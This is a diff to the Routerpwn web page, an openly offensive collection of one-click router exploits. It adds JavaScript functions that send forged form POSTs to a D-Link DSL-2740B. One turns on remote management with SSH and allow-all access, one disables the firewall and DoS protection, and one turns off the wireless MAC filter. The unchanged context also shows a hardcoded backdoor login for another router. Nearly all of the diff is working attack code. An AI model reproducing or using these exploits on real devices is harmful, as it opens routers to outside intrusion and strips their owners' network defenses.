@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.207</title>
+		<title>Routerpwn 1.13.210</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -236,6 +236,16 @@ function d615d3_changepass(ip)
 	document.location="http://"+ip+url;
 }
 
+function dsl2740b_disablemacfilter(ip)
+{
+	ip = ip || "192.168.1.1";
+	var form = '<input	type="hidden"	name="action" value="wlFltMode"/>';
+	form += '<input	type="hidden"	name="wlFltMacMode"	value="disabled"/>';
+	form += '</form>';
+	post('http://' + ip + '/wlmacflt.cmd', form);
+}
+
+
 // D-LINK DIR-280 - Change Admin Password
 function dir280_changepassword(ip)
 {
@@ -254,6 +264,25 @@ function dir280_changepassword(ip)
 			 <input type="hidden" value="" name="userpass">';
 	post('http://' + ip + '/goform/formPasswordSetup', form);
 
+}
+
+// D-Link DSL-2740B - Enable Remote Management
+function dsl2740b_remote(ip)
+{
+	ip = ip || "192.168.1.1";
+	var form = '<input	type="hidden"	name="action" value="save"/>';
+	form += '<input	type="hidden"	name="rmtmode"	value="1"/>';
+	form += '<input	type="hidden"	name="rmtport"	value="80"/>';
+	form += '<input	type="hidden"	name="rmtaction"	value="allowall"/>';
+	form += '<input	type="hidden"	name="ftp"	value="0"/>';
+	form += '<input	type="hidden"	name="http"	value="2"/>';
+	form += '<input	type="hidden"	name="icmp"	value="2"/>';
+	form += '<input	type="hidden"	name="snmp" value="2"/>';
+	form += '<input	type="hidden"	name="tftp"	value="0"/>';
+	form += '<input	type="hidden"	name="ssh"	value="1"/>';
+	form += '<input	type="hidden"	name="telnet"	value="0"/>';
+	form += '</form>';
+	post('http://' + ip + '/scsrvcntr.cmd', form);
 }
 
 // TP-Link TD-8840T - Reset Password 
@@ -540,6 +569,15 @@ function mt880adminr() {
 function dc227backdoor() {
 	ip=prompt("IP:");
 	document.location="http://adsl:epicrouter2007@"+ip;
+}
+
+function dsl2740b_disablefirewall(ip)
+{
+	ip = ip || "192.168.1.1";
+	var form = '<input	type="hidden"	name="fwFlag" value="521472"/>';
+	form += '<input	type="hidden"	name="dosenbl"	value="0"/>';
+	form += '</form>';
+	post('http://' + ip + '/scdmz.cmd', form);
 }
 
 function mt880fw() {
@@ -2628,7 +2666,7 @@ a=a+1
 <br><br>
 <section id="DLink">
 <h2>D-Link</h2>
-<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325, <a href="javascript:img('DSL-2750U')">DSL-2750U, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a></h3>
+<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325, <a href="javascript:img('DSL-2750U')">DSL-2750U, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a></h3>
 
 <article>
 	<div>01/15/14</div>
@@ -2650,6 +2688,28 @@ a=a+1
 	<div><a href="javascript:document.f2640U.submit()">D-Link DSL-2640U PPoE Data Disclosure (ADSL Router)</a></div>
 	<div><a href="javascript:ff2640U();">[SET IP]</a></div>
 </article>
+
+<article>
+	<div>09/08/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/28239/">[+]</a></div>
+	<div><a href="javascript:dsl2740b_remote()">D-Link DSL-2740B - Enable Remote Management</a></div>
+	<div><a href="javascript:dsl2740b_remote(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>09/08/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/28239/">[+]</a></div>
+	<div><a href="javascript:dsl2740b_disablefirewall()">D-Link DSL-2740B - Disable Firewall</a></div>
+	<div><a href="javascript:dsl2740b_disablefirewall(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>09/08/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/28239/">[+]</a></div>
+	<div><a href="javascript:dsl2740b_disablemacfilter()">D-Link DSL-2740B - Disable Wireless MAC Filter</a></div>
+	<div><a href="javascript:dsl2740b_disablemacfilter(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
 
 <article>
 	<div>07/26/13</div>
